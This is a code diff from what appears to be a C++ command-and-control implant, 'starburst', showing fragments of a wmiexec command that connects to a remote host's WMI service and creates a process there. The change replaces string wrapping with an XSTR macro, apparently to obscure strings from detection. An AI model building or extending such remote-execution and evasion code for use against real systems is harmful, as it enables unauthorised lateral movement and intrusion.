@@ -74,7 +74,7 @@ auto declfn starburst::cmd_wmiexec(
     auto host_str = parser_string( params, &host_len );
     if ( !host_str || host_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
+            XSTR( "no hostname provided" ) );
         return;
     }
 
@@ -82,7 +82,7 @@ auto declfn starburst::cmd_wmiexec(
     auto command_str = parser_string( params, &command_len );
     if ( !command_str || command_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
+            XSTR( "no command provided" ) );
         return;
     }
 
@@ -93,7 +93,7 @@ auto declfn starburst::cmd_wmiexec(
 
     if ( !h_ole32 || !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load COM libraries" ) ) );
+            XSTR( "failed to load COM libraries" ) );
         return;
     }
 
@@ -122,7 +122,7 @@ auto declfn starburst::cmd_wmiexec(
     if ( !pCoInitializeEx || !pCoCreateInstance || !pCoSetProxyBlanket ||
          !pSysAllocString || !pSysFreeString ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve COM APIs" ) ) );
+            XSTR( "failed to resolve COM APIs" ) );
         return;
     }
 
@@ -146,7 +146,7 @@ auto declfn starburst::cmd_wmiexec(
     if ( FAILED( hr ) || !pLoc ) {
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CoCreateInstance WbemLocator failed" ) ) );
+            XSTR( "CoCreateInstance WbemLocator failed" ) );
         return;
     }
 
@@ -159,7 +159,7 @@ auto declfn starburst::cmd_wmiexec(
         pLoc->lpVtbl->Release( pLoc );
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "ConnectServer failed - check perms/network" ) ) );
+            XSTR( "ConnectServer failed - check perms/network" ) );
         return;
     }
 
@@ -176,7 +176,7 @@ auto declfn starburst::cmd_wmiexec(
         pLoc->lpVtbl->Release( pLoc );
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetObject Win32_Process failed" ) ) );
+            XSTR( "GetObject Win32_Process failed" ) );
         return;
     }
 
@@ -193,7 +193,7 @@ auto declfn starburst::cmd_wmiexec(
         pLoc->lpVtbl->Release( pLoc );
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetMethod Create failed" ) ) );
+            XSTR( "GetMethod Create failed" ) );
         return;
     }
 
@@ -238,10 +238,10 @@ auto declfn starburst::cmd_wmiexec(
 
     if ( SUCCEEDED( hr ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "process created via WMI" ) ) );
+            XSTR( "process created via WMI" ) );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "WMI ExecMethod failed" ) ) );
+            XSTR( "WMI ExecMethod failed" ) );
     }
 }
 
